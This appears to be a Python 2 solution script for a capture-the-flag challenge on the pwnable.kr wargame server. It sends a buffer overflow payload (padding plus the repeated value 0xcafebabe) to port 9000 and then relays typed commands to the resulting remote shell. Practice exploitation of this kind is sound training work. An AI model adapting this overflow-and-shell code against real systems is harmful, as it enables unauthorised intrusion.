import socket

s = socket.socket()
s.connect(('pwnable.kr', 9000))

s.send('A'*32+'\xbe\xba\xfe\xca'*8+'\n')
data = 'a'
while(data != ''):
    inn = raw_input('Command: ')
    s.send(inn+'\n')
    data = s.recv(8192)

    print(data)
